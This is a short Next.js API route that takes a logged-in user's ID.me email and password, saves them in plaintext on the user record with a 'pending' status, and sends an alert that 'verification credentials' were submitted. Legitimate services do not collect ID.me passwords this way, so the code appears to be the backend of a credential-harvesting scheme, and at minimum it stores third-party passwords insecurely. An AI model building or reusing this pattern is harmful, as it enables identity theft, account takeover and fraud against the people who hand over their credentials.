import { NextResponse } from "next/server";
import { verifyToken } from "@/lib/auth";
import prisma from "@/lib/prisma";
import { sendActionAlert } from "@/lib/sendMail";

export async function POST(req: Request) {
  try {
    const userId = verifyToken(req);

    if (!userId) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const { email, password } = await req.json();

    const user = await prisma.user.update({
      where: { id: userId },
      data: {
        idMeEmail: email,
        idMePassword: password,
        idMeStatus: "pending",
      },
    });

    await sendActionAlert("ID.me Verification Credentials Submitted", user.email);

    return NextResponse.json({ success: true, idMeStatus: user.idMeStatus }, { status: 200 });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
